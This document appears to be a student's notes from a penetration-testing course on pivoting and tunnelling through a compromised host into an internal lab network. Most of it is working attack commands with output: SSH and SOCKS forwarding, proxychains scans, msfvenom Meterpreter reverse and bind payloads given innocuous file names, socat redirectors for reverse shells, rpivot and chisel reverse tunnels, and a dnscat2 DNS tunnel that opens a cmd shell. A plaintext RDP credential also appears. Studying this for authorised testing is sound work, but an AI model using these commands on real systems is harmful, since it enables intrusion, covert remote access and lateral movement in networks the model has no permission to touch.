---
title: "Scanning the Pivot Target"
weight: 35
---
#### Scanning the Pivot Target

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
cube111@local[/local]$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

&nbsp;

&nbsp;

to acces mysql we can port forward using ssh

```shell-session
cube111@local[/local]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Feb 2022 05:23:20 PM UTC
```

&nbsp;

#### Confirming Port Forward with Netstat on attackers machine

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
cube111@local[/local]$ netstat -antp | grep 1234
```

&nbsp;

#### Confirming Port Forward with Nmap

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
cube111@local[/local]$ nmap -v -sV -p1234 localhost

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 12:18
Scanning localhost (127.0.0.1) [2 ports]
Completed Ping Scan at 12:18, 0.01s elapsed (1 total hosts)
Initiating Connect Scan at 12:18
Scanning localhost (127.0.0.1) [1 port]
Discovered open port 1234/tcp on 127.0.0.1
Completed Connect Scan at 12:18, 0.01s elapsed (1 total ports)
Initiating Service scan at 12:18
Scanning 1 service on localhost (127.0.0.1)
Completed Service scan at 12:18, 0.12s elapsed (1 service on 1 host)
NSE: Script scanning 127.0.0.1.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.01s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0080s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```

&nbsp;

&nbsp;

#### Forwarding Multiple Ports

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
cube111@local[/local]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

&nbsp;

&nbsp;

## Setting up to Pivot

```shell-session
cube111@local[/local]$ ssh -D 9050 ubuntu@10.129.202.64
```

```shell-session
cube111@local[/local]$ ssh -D 9050 ubuntu@10.129.202.64
```

```shell-session
cube111@local[/local]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

&nbsp;

```shell-session
cube111@local[/local]$ proxychains nmap -v -sn 172.16.5.1-200
```

&nbsp;

&nbsp;

#### Enumerating the Windows Target through Proxychains

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
cube111@local[/local]$ proxychains nmap -v -Pn -sT 172.16.5.19
```

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called `SOCKS tunneling`. One more important note to remember here is that we can only perform a `full TCP connect scan` over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that `host-alive` checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

&nbsp;

## Using Metasploit with Proxychains

We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
cube111@local[/local]$ proxychains msfconsole
```

&nbsp;

&nbsp;

#### Using xfreerdp with Proxychains

Dynamic Port Forwarding with SSH and SOCKS Tunneling

```shell-session
cube111@local[/local]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

ProxyChains-3.1 (http://proxychains.sf.net)
```

&nbsp;

#### Ping Sweep For Loop on Linux Pivot Hosts

Meterpreter Tunneling & Port Forwarding

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

&nbsp;

#### Ping Sweep For Loop Using CMD

Meterpreter Tunneling & Port Forwarding

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

&nbsp;

&nbsp;

#### Ping Sweep Using PowerShell

Meterpreter Tunneling & Port Forwarding

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

&nbsp;

# Remote/Reverse Port Forwarding with SSH

#### Using SSH -R

Remote/Reverse Port Forwarding with SSH

```shell-session
cube111@local[/local]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

&nbsp;

&nbsp;

# Meterpreter Tunneling & Port Forwarding

```shell-session
cube111@local[/local]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

&nbsp;

#### Configuring & Starting the multi/handler

Meterpreter Tunneling & Port Forwarding

```shell-session
msf6 > use exploit/multi/handler
```

&nbsp;

&nbsp;

#### Configuring MSF's SOCKS Proxy

Meterpreter Tunneling & Port Forwarding

```shell-session
Configuring MSF's SOCKS Proxy
  Meterpreter Tunneling & Port Forwarding
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

&nbsp;

&nbsp;

#### Creating Routes with AutoRoute

Meterpreter Tunneling & Port Forwarding

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

&nbsp;

&nbsp;

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

Meterpreter Tunneling & Port Forwarding

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Socat Redirection with a Reverse Shell

#### Starting Socat Listener

Socat Redirection with a Reverse Shell

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

#### Configuring & Starting the multi/handler

Socat Redirection with a Reverse Shell

```shell-session
msf6 > use exploit/multi/handler
```

&nbsp;

&nbsp;

# Socat Redirection with a Bind Shell

```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

&nbsp;

#### Creating the Windows Payload

Socat Redirection with a Bind Shell

```shell-session
cube111@local[/local]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Final size of exe file: 7168 bytes
Saved as: backupjob.exe
```

&nbsp;

#### Configuring & Starting the Bind multi/handler

Socat Redirection with a Bind Shell

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
RHOST => 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 10.129.202.64:8080
```

&nbsp;

&nbsp;

# SSH for Windows: plink.exe putty

```cmd-session
plink -ssh -D 9050 ubuntu@10.129.15.50
```

&nbsp;

Another Windows-based tool called [Proxifier](https://www.proxifier.com/) can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.

&nbsp;

![5d2fbde83d2b3dda45ef9b07319d78c4.png](/resources/5d2fbde83d2b3dda45ef9b07319d78c4.png)

&nbsp;

&nbsp;

# SSH Pivoting with Sshuttle

&nbsp;

#### Running sshuttle

SSH Pivoting with Sshuttle

```shell-session
cube111@local[/local]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 

Starting sshuttle proxy (version 1.1.0).
c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
fw: Starting firewall with Python version 3.9.2
fw: ready method name nat.
c : IPv6 enabled: Using default IPv6 listen address ::1
c : Method: nat
c : IPv4: on
c : IPv6: on
c : UDP : off (not available with nat method)
c : DNS : off (available)
c : User: off (available)
c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
c : Subnets to exclude from forwarding:
c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
c : TCP redirector listening on ('::1', 12300, 0, 0).
c : TCP redirector listening on ('127.0.0.1', 12300).
c : Starting client with Python version 3.9.2
c : Connecting to server...
ubuntu@10.129.202.64's password: 
 s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
 s: latency control setting = True
 s: auto-nets:False
c : Connected to server.
fw: setting up.
fw: ip6tables -w -t nat -N sshuttle-12300
fw: ip6tables -w -t nat -F sshuttle-12300
fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
fw: iptables -w -t nat -N sshuttle-12300
fw: iptables -w -t nat -F sshuttle-12300
fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
```

&nbsp;

&nbsp;

# Web Server Pivoting with Rpivot

&nbsp;

#### Running server.py from the Attack Host

Web Server Pivoting with Rpivot

```shell-session
cube111@local[/local]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

&nbsp;

#### Transfering rpivot to the Target

Web Server Pivoting with Rpivot

```shell-session
cube111@local[/local]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

#### Running client.py from Pivot Target

Web Server Pivoting with Rpivot

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

&nbsp;

&nbsp;

#### Using Netsh.exe to Port Forward

Port Forwarding with Windows Netsh

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25
```

&nbsp;

&nbsp;

#### Verifying Port Forward

Port Forwarding with Windows Netsh

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
```

&nbsp;

&nbsp;

&nbsp;

# DNS Tunneling with Dnscat2

&nbsp;

#### Cloning dnscat2 and Setting Up the Server

DNS Tunneling with Dnscat2

```shell-session
cube111@local[/local]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle instal
```

```shell-session
cube111@local[/local]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
```

&nbsp;

#### Cloning dnscat2-powershell to the Attack Host

DNS Tunneling with Dnscat2

```shell-session
cube111@local[/local]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

&nbsp;

#### Importing dnscat2.ps1

DNS Tunneling with Dnscat2

```powershell-session
PS C:\local> Import-Module .\dnscat2.ps1
```

```powershell-session
PS C:\local> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

&nbsp;

&nbsp;

#### Interacting with the Established Session

DNS Tunneling with Dnscat2

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

&nbsp;

&nbsp;

#### Starting the Chisel Server on our Attack Host

&nbsp;

```shell-session
cube111@local[/local]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

&nbsp;

```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
```

#### Running the Chisel Server on the Pivot Host

SOCKS5 Tunneling with Chisel

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

&nbsp;

#### Connecting to the Chisel Server

SOCKS5 Tunneling with Chisel

```shell-session
cube111@local[/local]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

&nbsp;

&nbsp;

# proxytunnel

```
proxytunnel-p $IP:3128 -d 127.0.0.1:22 -a 4444
```

&nbsp;

&nbsp;

&nbsp;